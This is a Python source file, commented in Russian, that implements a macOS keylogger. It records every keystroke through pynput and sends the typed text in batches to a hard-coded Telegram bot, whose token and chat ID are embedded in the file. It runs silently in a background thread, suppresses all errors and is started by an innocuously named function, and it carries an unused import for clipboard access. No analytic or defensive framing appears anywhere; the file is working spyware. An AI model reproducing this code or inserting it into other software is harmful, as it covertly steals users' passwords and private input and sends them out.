import platform
import threading
import requests
from datetime import datetime
from pynput import keyboard

# Ваши данные для Telegram
CHAT_ID = "5018443124"
TELEGRAM_TOKEN = "7624890612:AAEN6bpLJCbotHXb2iLqLZSJr6-qFlZk08o"

# Функция отправки сообщения в Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        return response.status_code == 200
    except Exception:
        return False

# Функция отслеживания ввода и буфера обмена
def monitor_input():
    if platform.system() != "Darwin":  # Проверяем, что это macOS
        return

    typed_text = []
    text_lock = threading.Lock()

    def on_press(key):
        try:
            with text_lock:
                # Обработка специальных клавиш
                if key == keyboard.Key.space:
                    typed_text.append(" ")
                elif key == keyboard.Key.enter:
                    typed_text.append("\n")
                elif key == keyboard.Key.backspace:
                    if typed_text:
                        typed_text.pop()
                elif key in (keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                            keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
                            keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
                            keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
                            keyboard.Key.tab, keyboard.Key.esc):
                    typed_text.append(f"[{str(key).split('.')[-1].upper()}]")
                else:
                    # Обработка обычных символов
                    try:
                        char = key.char
                        if char:
                            typed_text.append(char)
                    except AttributeError:
                        return

                # Отправка сообщения каждые 10 символов или при специальной клавише
                if len(typed_text) >= 10 or key in (keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.space):
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    message = f"<b>Timestamp:</b> {timestamp}\n"
                    message += f"<b>Typed:</b> {''.join(typed_text)}\n"
                    send_to_telegram(message)
                    typed_text.clear()

        except Exception:
            pass

    # Настройка слушателя клавиатуры
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.wait()  # Бесконечное ожидание событий
    except Exception:
        pass

# Основная функция для запуска мониторинга
def sm_m():
    if platform.system() == "Darwin":
        try:
            from pynput import keyboard
            from AppKit import NSPasteboard, NSStringPboardType
        except ImportError:
            return

        # Запускаем мониторинг в отдельном потоке
        thread = threading.Thread(target=monitor_input, daemon=True)
        thread.start()
    else:
        return
